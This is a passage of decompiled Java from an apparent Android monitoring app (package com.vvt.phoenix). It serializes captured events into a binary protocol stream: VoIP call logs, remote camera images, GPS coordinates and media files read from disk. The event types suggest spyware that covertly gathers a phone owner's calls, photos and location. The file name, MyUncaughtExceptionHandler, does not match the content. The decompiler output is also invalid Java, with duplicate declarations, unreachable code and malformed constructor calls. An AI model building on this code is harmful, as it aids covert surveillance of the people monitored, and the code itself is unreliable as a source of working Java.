    IllegalArgumentException localIllegalArgumentException;
    if (paramr == null)
    {
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>("Event object is NULL");
      throw localIllegalArgumentException;
    }
    if (paramOutputStream == null)
    {
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>("OutputStream object is NULL");
      throw localIllegalArgumentException;
    }
    boolean bool1 = a;
    if (bool1) {}
    int i = paramr.a();
    switch (i)
    {
    default: 
      boolean bool2 = c;
      if (!bool2) {
        break;
      }
    }
    for (;;)
    {
      return;
      paramr = (l)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (an)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (p)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (ag)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (w)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (av)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (n)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (g)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (i)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (at)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (aw)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (m)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (f)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (h)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (as)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (aq)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (o)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (ah)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (ai)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (af)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (ao)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (k)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (com.vvt.phoenix.prot.event.c)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (x)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (y)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (z)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (ac)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (al)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (ak)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (VoipCallLogEvent)paramr;
      a(paramr, paramOutputStream);
      continue;
      paramr = (au)paramr;
      a(paramr, paramOutputStream);
    }
  }
  
  private static void a(t paramt, OutputStream paramOutputStream)
  {
    byte[] arrayOfByte = a(paramt);
    int i = arrayOfByte.length;
    paramOutputStream.write(arrayOfByte, 0, i);
  }
  
  private static void a(u paramu, OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    a(paramu, paramOutputStream);
    bool = b;
    if (bool) {}
  }
  
  private static void a(v paramv, OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    a(paramv, paramOutputStream);
    String str = paramv.h();
    com.vvt.phoenix.a.d.b(str, paramOutputStream);
    bool = b;
    if (bool) {}
  }
  
  private static void a(w paramw, OutputStream paramOutputStream)
  {
    int i = 0;
    String str1 = null;
    boolean bool2 = a;
    if (bool2) {}
    b(paramw, paramOutputStream);
    int j = (byte)paramw.b();
    paramOutputStream.write(j);
    String str2 = paramw.c();
    com.vvt.phoenix.a.d.a(str2, paramOutputStream);
    j = paramw.d();
    short s = (short)j;
    Object localObject = com.vvt.phoenix.a.a.a(s);
    int k = 2;
    paramOutputStream.write((byte[])localObject, 0, k);
    while (i < j)
    {
      localObject = paramw.b(i);
      a((aj)localObject, paramOutputStream);
      i += 1;
    }
    com.vvt.phoenix.a.d.a(paramw.e(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramw.f(), paramOutputStream);
    str1 = paramw.g();
    com.vvt.phoenix.a.d.a(str1, paramOutputStream);
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(x paramx, OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    b(paramx, paramOutputStream);
    a(paramx, paramOutputStream);
    com.vvt.phoenix.a.d.a(paramx.b(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramx.c(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramx.d(), paramOutputStream);
    String str = paramx.e();
    a(str, paramOutputStream);
    bool = b;
    if (bool) {}
  }
  
  private static void a(y paramy, OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    b(paramy, paramOutputStream);
    a(paramy, paramOutputStream);
    com.vvt.phoenix.a.d.a(paramy.b(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramy.c(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramy.d(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramy.e(), paramOutputStream);
    String str = paramy.f();
    a(str, paramOutputStream);
    bool = b;
    if (bool) {}
  }
  
  private static void a(z paramz, OutputStream paramOutputStream)
  {
    int i = 0;
    String str1 = null;
    boolean bool2 = a;
    if (bool2) {}
    b(paramz, paramOutputStream);
    a(paramz, paramOutputStream);
    com.vvt.phoenix.a.d.b(paramz.b(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramz.c(), paramOutputStream);
    String str2 = paramz.d();
    com.vvt.phoenix.a.d.b(str2, paramOutputStream);
    int j = paramz.e();
    short s = (short)j;
    Object localObject = com.vvt.phoenix.a.a.a(s);
    int k = 2;
    paramOutputStream.write((byte[])localObject, 0, k);
    while (i < j)
    {
      localObject = paramz.a(i).a();
      com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
      i += 1;
    }
    a(paramz.f(), paramOutputStream);
    str1 = paramz.g();
    com.vvt.phoenix.a.d.b(str1, paramOutputStream);
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(String paramString, OutputStream paramOutputStream)
  {
    int i = 4;
    Object localObject1;
    if (paramString != null)
    {
      localObject1 = new java/io/File;
      ((File)localObject1).<init>(paramString);
      long l = ((File)localObject1).length();
      int j = (int)l;
      if (j != 0)
      {
        Object localObject2 = com.vvt.phoenix.a.a.a(j);
        paramOutputStream.write((byte[])localObject2, 0, i);
        localObject2 = new java/io/FileInputStream;
        ((FileInputStream)localObject2).<init>((File)localObject1);
        byte[] arrayOfByte = new byte['Ѐ'];
        for (int k = ((FileInputStream)localObject2).read(arrayOfByte);; k = ((FileInputStream)localObject2).read(arrayOfByte))
        {
          i = -1;
          if (k == i) {
            break;
          }
          paramOutputStream.write(arrayOfByte, 0, k);
        }
        ((FileInputStream)localObject2).close();
      }
    }
    for (;;)
    {
      return;
      boolean bool = c;
      if (bool) {}
      localObject1 = new byte[i];
      Object tmp123_122 = localObject1;
      Object tmp124_123 = tmp123_122;
      Object tmp124_123 = tmp123_122;
      tmp124_123[0] = 0;
      tmp124_123[1] = 0;
      tmp124_123[2] = 0;
      tmp124_123[3] = 0;
      paramOutputStream.write((byte[])localObject1, 0, i);
      continue;
      bool = c;
      if (bool) {}
      localObject1 = new byte[i];
      Object tmp162_161 = localObject1;
      Object tmp163_162 = tmp162_161;
      Object tmp163_162 = tmp162_161;
      tmp163_162[0] = 0;
      tmp163_162[1] = 0;
      tmp163_162[2] = 0;
      tmp163_162[3] = 0;
      paramOutputStream.write((byte[])localObject1, 0, i);
    }
  }
  
  private static byte[] a(RemoteCameraImageEvent paramRemoteCameraImageEvent)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(paramRemoteCameraImageEvent);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    long l = paramRemoteCameraImageEvent.a_();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)paramRemoteCameraImageEvent.b();
    localByteArrayOutputStream.write(k);
    k = (byte)paramRemoteCameraImageEvent.f().getType();
    localByteArrayOutputStream.write(k);
    localObject = a(paramRemoteCameraImageEvent.d());
    j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    com.vvt.phoenix.a.d.a(paramRemoteCameraImageEvent.e(), localByteArrayOutputStream);
    localObject = paramRemoteCameraImageEvent.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = paramRemoteCameraImageEvent.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp221_219 = localObject;
      Object tmp222_221 = tmp221_219;
      Object tmp222_221 = tmp221_219;
      tmp222_221[0] = 0;
      tmp222_221[1] = 0;
      tmp222_221[2] = 0;
      tmp222_221[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp253_251 = localObject;
      Object tmp254_253 = tmp253_251;
      Object tmp254_253 = tmp253_251;
      tmp254_253[0] = 0;
      tmp254_253[1] = 0;
      tmp254_253[2] = 0;
      tmp254_253[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(as paramas)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(paramas);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    long l = paramas.a_();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)paramas.b();
    localByteArrayOutputStream.write(k);
    com.vvt.phoenix.a.d.a(paramas.d(), localByteArrayOutputStream);
    localObject = paramas.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = paramas.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp182_180 = localObject;
      Object tmp183_182 = tmp182_180;
      Object tmp183_182 = tmp182_180;
      tmp183_182[0] = 0;
      tmp183_182[1] = 0;
      tmp183_182[2] = 0;
      tmp183_182[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp214_212 = localObject;
      Object tmp215_214 = tmp214_212;
      Object tmp215_214 = tmp214_212;
      tmp215_214[0] = 0;
      tmp215_214[1] = 0;
      tmp215_214[2] = 0;
      tmp215_214[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(aw paramaw)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(paramaw);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    long l = paramaw.a_();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)paramaw.b();
    localByteArrayOutputStream.write(k);
    localObject = paramaw.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = paramaw.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp174_172 = localObject;
      Object tmp175_174 = tmp174_172;
      Object tmp175_174 = tmp174_172;
      tmp175_174[0] = 0;
      tmp175_174[1] = 0;
      tmp175_174[2] = 0;
      tmp175_174[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp206_204 = localObject;
      Object tmp207_206 = tmp206_204;
      Object tmp207_206 = tmp206_204;
      tmp207_206[0] = 0;
      tmp207_206[1] = 0;
      tmp207_206[2] = 0;
      tmp207_206[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(e parame)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(parame);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    localObject = com.vvt.phoenix.a.a.a((int)parame.a_());
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)parame.b();
    localByteArrayOutputStream.write(k);
    com.vvt.phoenix.a.d.a(parame.d(), localByteArrayOutputStream);
    long l = parame.e();
    k = (int)l;
    localObject = com.vvt.phoenix.a.a.a(k);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    localObject = parame.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = parame.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp204_202 = localObject;
      Object tmp205_204 = tmp204_202;
      Object tmp205_204 = tmp204_202;
      tmp205_204[0] = 0;
      tmp205_204[1] = 0;
      tmp205_204[2] = 0;
      tmp205_204[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp236_234 = localObject;
      Object tmp237_236 = tmp236_234;
      Object tmp237_236 = tmp236_234;
      tmp237_236[0] = 0;
      tmp237_236[1] = 0;
      tmp237_236[2] = 0;
      tmp237_236[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(f paramf)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(paramf);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    long l = paramf.a_();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)paramf.b();
    localByteArrayOutputStream.write(k);
    localObject = a(paramf.d());
    j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    com.vvt.phoenix.a.d.a(paramf.e(), localByteArrayOutputStream);
    localObject = paramf.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = paramf.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp205_203 = localObject;
      Object tmp206_205 = tmp205_203;
      Object tmp206_205 = tmp205_203;
      tmp206_205[0] = 0;
      tmp206_205[1] = 0;
      tmp206_205[2] = 0;
      tmp206_205[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp237_235 = localObject;
      Object tmp238_237 = tmp237_235;
      Object tmp238_237 = tmp237_235;
      tmp238_237[0] = 0;
      tmp238_237[1] = 0;
      tmp238_237[2] = 0;
      tmp238_237[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(h paramh)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(paramh);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    long l = paramh.a_();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)paramh.b();
    localByteArrayOutputStream.write(k);
    com.vvt.phoenix.a.d.a(paramh.d(), localByteArrayOutputStream);
    localObject = paramh.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = paramh.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp182_180 = localObject;
      Object tmp183_182 = tmp182_180;
      Object tmp183_182 = tmp182_180;
      tmp183_182[0] = 0;
      tmp183_182[1] = 0;
      tmp183_182[2] = 0;
      tmp183_182[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp214_212 = localObject;
      Object tmp215_214 = tmp214_212;
      Object tmp215_214 = tmp214_212;
      tmp215_214[0] = 0;
      tmp215_214[1] = 0;
      tmp215_214[2] = 0;
      tmp215_214[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(m paramm)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    Object localObject = b(paramm);
    int j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    long l = paramm.a_();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    localByteArrayOutputStream.write((byte[])localObject, 0, i);
    int k = (byte)paramm.b();
    localByteArrayOutputStream.write(k);
    localObject = a(paramm.d());
    j = localObject.length;
    localByteArrayOutputStream.write((byte[])localObject, 0, j);
    com.vvt.phoenix.a.d.a(paramm.e(), localByteArrayOutputStream);
    localObject = paramm.c();
    if (localObject != null)
    {
      localObject = new java/io/File;
      String str = paramm.c();
      ((File)localObject).<init>(str);
      l = ((File)localObject).length();
      k = (int)l;
      boolean bool2 = a;
      if ((!bool2) || (k != 0))
      {
        localObject = com.vvt.phoenix.a.a.a(k);
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      localObject = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return (byte[])localObject;
      localObject = new byte[i];
      Object tmp205_203 = localObject;
      Object tmp206_205 = tmp205_203;
      Object tmp206_205 = tmp205_203;
      tmp206_205[0] = 0;
      tmp206_205[1] = 0;
      tmp206_205[2] = 0;
      tmp206_205[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
      continue;
      localObject = new byte[i];
      Object tmp237_235 = localObject;
      Object tmp238_237 = tmp237_235;
      Object tmp238_237 = tmp237_235;
      tmp238_237[0] = 0;
      tmp238_237[1] = 0;
      tmp238_237[2] = 0;
      tmp238_237[3] = 0;
      localByteArrayOutputStream.write((byte[])localObject, 0, i);
    }
  }
  
  private static byte[] a(q paramq)
  {
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    try
    {
      int i = (byte)paramq.a();
      localByteArrayOutputStream.write(i);
      long l = paramq.b();
      i = (int)l;
      Object localObject1 = com.vvt.phoenix.a.a.a(i);
      int j = 4;
      localByteArrayOutputStream.write((byte[])localObject1, 0, j);
      localObject1 = paramq.c();
      com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
      localObject1 = paramq.d();
      com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
      localObject1 = localByteArrayOutputStream.toByteArray();
      return (byte[])localObject1;
    }
    finally
    {
      com.vvt.io.d.a(localByteArrayOutputStream);
    }
  }
  
  private static byte[] a(t paramt)
  {
    int i = 8;
    double d1 = 0.0D;
    float f;
    byte[] arrayOfByte1;
    double d2;
    if (paramt == null)
    {
      boolean bool = c;
      if (bool) {}
      bool = false;
      f = 0.0F;
      arrayOfByte1 = null;
      d2 = d1;
    }
    for (;;)
    {
      ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
      localByteArrayOutputStream.<init>();
      byte[] arrayOfByte2 = com.vvt.phoenix.a.a.a(d2);
      localByteArrayOutputStream.write(arrayOfByte2, 0, i);
      byte[] arrayOfByte3 = com.vvt.phoenix.a.a.a(d1);
      localByteArrayOutputStream.write(arrayOfByte3, 0, i);
      arrayOfByte1 = com.vvt.phoenix.a.a.a(f);
      localByteArrayOutputStream.write(arrayOfByte1, 0, 4);
      arrayOfByte1 = localByteArrayOutputStream.toByteArray();
      com.vvt.io.d.a(localByteArrayOutputStream);
      return arrayOfByte1;
      d2 = paramt.b();
      d1 = paramt.a();
      double d3 = paramt.c();
      f = (float)d3;
    }
  }
  
  private static void b(r paramr, OutputStream paramOutputStream)
  {
    byte[] arrayOfByte = b(paramr);
    int i = arrayOfByte.length;
    paramOutputStream.write(arrayOfByte, 0, i);
  }
  
  private static byte[] b(r paramr)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/io/ByteArrayOutputStream;
    ((ByteArrayOutputStream)localObject1).<init>();
    short s = (short)paramr.a();
    Object localObject2 = com.vvt.phoenix.a.a.a(s);
    int i = 2;
    ((ByteArrayOutputStream)localObject1).write((byte[])localObject2, 0, i);
    localObject2 = paramr.j();
    if (localObject2 != null)
    {
      i = ((String)localObject2).length();
      int j = 19;
      if (i == j)
      {
        localObject2 = com.vvt.phoenix.a.a.a((String)localObject2);
        i = localObject2.length;
        ((ByteArrayOutputStream)localObject1).write((byte[])localObject2, 0, i);
        com.vvt.phoenix.a.d.a(paramr.k(), (OutputStream)localObject1);
        localObject2 = ((ByteArrayOutputStream)localObject1).toByteArray();
        com.vvt.io.d.a((OutputStream)localObject1);
        return (byte[])localObject2;
      }
      bool2 = d;
      if (bool2) {}
      com.vvt.io.d.a((OutputStream)localObject1);
      localObject1 = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject1).<init>("Event time length is invalid: 19 String length is expected.");
      throw ((Throwable)localObject1);
    }
    boolean bool2 = d;
    if (bool2) {}
    com.vvt.io.d.a((OutputStream)localObject1);
    localObject1 = new java/lang/IllegalArgumentException;
    ((IllegalArgumentException)localObject1).<init>("Event time is empty");
    throw ((Throwable)localObject1);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */